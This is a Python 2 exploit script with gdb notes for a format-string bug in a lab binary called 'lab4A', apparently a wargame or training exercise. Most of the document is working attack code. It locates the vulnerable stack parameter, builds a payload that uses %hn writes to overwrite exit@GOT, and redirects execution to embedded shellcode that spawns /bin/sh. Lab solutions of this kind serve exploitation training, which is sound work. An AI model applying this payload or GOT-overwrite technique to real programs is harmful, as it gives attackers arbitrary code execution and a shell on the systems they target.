# Overwrite exit@GOT
# 
# JMP to shellcode at exit()
# (gdb) disas main
#   => 0x080495ef <+793>:   call   0x8049180 <exit@plt>
'''
gdb-peda$ disas 0x8049180
Dump of assembler code for function exit@plt:
   0x08049180 <+0>:     endbr32 
   0x08049184 <+4>:     jmp    DWORD PTR ds:0x804b3c4
   0x0804918a <+10>:    nop    WORD PTR [eax+eax*1+0x0]
End of assembler dump.

gdb-peda$ x 0x804b3c4
0x804b3c4 <exit@got.plt>:       0x080490c0
'''


#  Check the vulnerable parameter number :
'''
for i in {1..100}; do echo "AAAA $i--%$i\$x" | ./lab4A  | grep 41414141 ;done
AAAA 37--41414141 does not have access!
'''

import struct  

target_addr = 0x804b3c4 # Pointer to accessible memory => exit@got.plt
h_target_addr = target_addr + 2 # Next 2 bytes written to 0x804b3c6
 
# Find starting point for shellcode:
'''
buf = ""
buf += struct.pack("<I",target_addr) 
buf += struct.pack("<I",h_target_addr) 
buf += "BBBB" + "A" * 50

gdb-peda$ find "BBBB"
Searching for 'BBBB' in: None ranges
Found 2 results, display max 2 items:
 [heap] : 0x804c6f8 ("BBBB", 'A' <repeats 50 times>, "%49826p%37$hn%17700p%38$hn\n")
[stack] : 0xffffce1c ("BBBB", 'A' <repeats 50 times>, "%49826p%37$hn%17700p%38$hn")")
'''

# Value to write in memory by %n => 0x804c6f8 (shellcode start)
value_2 = 0x0804
value_1 = 0xc6f8

# shellcode 28
shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"

buf = "" 
buf += struct.pack("<I",target_addr) 
buf += struct.pack("<I",h_target_addr) 
buf += shellcode

# Count length of character width 
count = value_1 - len(buf) 
buf += "%" + str(count) + "p"  # character width ( how many bytes to write )
buf += "%37$hn" # Direct parameter access, write the value of 2 bytes to location pointed  by 37th parameter on stack 
 
# Decrase the number of bytes to write by the number of bytes already written 
count = (value_2 | 0x10000) - value_1
buf += "%" + str(count) + "p" 
buf += "%38$hn" # as above, but 38th parameter 
print buf
